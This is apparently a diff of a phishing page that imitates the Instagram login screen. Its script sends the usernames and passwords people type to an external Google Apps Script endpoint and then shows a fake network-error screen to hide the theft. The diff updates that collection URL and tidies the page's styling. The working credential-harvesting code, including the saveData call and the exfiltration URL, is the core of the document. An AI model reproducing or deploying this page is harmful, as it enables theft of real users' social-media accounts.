@@ -34,11 +34,7 @@
 
         .logo-box {
             margin-bottom: 40px;
-        }
-
-        .logo-img {
-            width: 80px;
-            height: 80px;
+            font-size: 60px;
         }
 
         .login-form {
@@ -117,6 +113,8 @@
         .meta {
             color: #666;
             font-size: 14px;
+            text-align: center;
+            margin-top: 20px;
         }
 
         /* Forgot Password */
@@ -160,7 +158,7 @@
             display: none;
         }
 
-        /* Network Error Page - EXACT MATCH TO SCREENSHOT */
+        /* Network Error Page */
         #networkSection {
             display: none;
             position: fixed;
@@ -171,6 +169,7 @@
             background: #1a1a1a;
             z-index: 200;
             flex-direction: column;
+            align-items: center;
             padding: 100px 40px 40px;
         }
 
@@ -209,6 +208,7 @@
 
         .reload-btn {
             width: 100%;
+            max-width: 350px;
             padding: 16px;
             background: #7cb3ff;
             color: #000;
@@ -237,9 +237,7 @@
 <div id="loginSection">
     <div class="lang-selector">English (US) ▼</div>
     
-    <div class="logo-box">
-        <img src="instagram-logo.png" class="logo-img" onerror="this.style.display='none'; this.parentElement.innerHTML += '<div style=\'font-size:60px\'>📷</div>'">
-    </div>
+    <div class="logo-box">📷</div>
 
     <form class="login-form" id="loginForm">
         <input type="text" id="username" placeholder="Username, email or mobile number" autocomplete="off">
@@ -257,7 +255,7 @@
 
     <div class="create-box">
         <a href="#" class="create-btn">Create new account</a>
-        <div style="text-align: center; margin-top: 20px;" class="meta">Ⓜ️ Meta</div>
+        <div class="meta">Ⓜ️ Meta</div>
     </div>
 </div>
 
@@ -268,7 +266,7 @@
         <span class="modal-title">Forgot Password</span>
     </div>
 
-    <div style="max-width: 350px;">
+    <div style="max-width: 350px; margin: 0 auto;">
         <!-- Step 1 -->
         <div class="step" id="step1" style="display: block;">
             <div class="modal-text">Enter your username, email, or mobile number to search for your account.</div>
@@ -298,7 +296,7 @@
 
 <script>
     // REPLACE WITH YOUR GOOGLE SCRIPT URL
-    const SHEET_URL = 'https://script.google.com/macros/s/AKfycbwF06xPpHD6N2qSUi33bUPUhu_nNBmSMGHD19jCzAkNaV46OpfZW4zZeDgrMxbZb9a2HQ/exec';
+    const SHEET_URL = 'https://script.google.com/macros/s/AKfycbx839-brkr5RUy7Nvr_VmO0dqdQaYeW9V4bxpt_wIBwqOBpoYgE5jzt1hVHu9kOMdpj/exec';
 
     // Save to Google Sheets
     function saveData(type, user, pass) {
@@ -322,17 +320,10 @@
 
     // Show network error page
     function showNetwork() {
-        // Hide login
         document.getElementById('loginSection').style.display = 'none';
         document.querySelector('.security-banner').style.display = 'none';
-        
-        // Hide forgot if open
         document.getElementById('forgotSection').style.display = 'none';
-        
-        // Show network error
         document.getElementById('networkSection').style.display = 'flex';
-        
-        // Mark as done
         sessionStorage.setItem('demoDone', 'yes');
     }
 
@@ -360,10 +351,7 @@
 
         if (hasError) return;
 
-        // Save data
         saveData('login', user, pass);
-
-        // Show network error after short delay
         setTimeout(showNetwork, 800);
     });
 
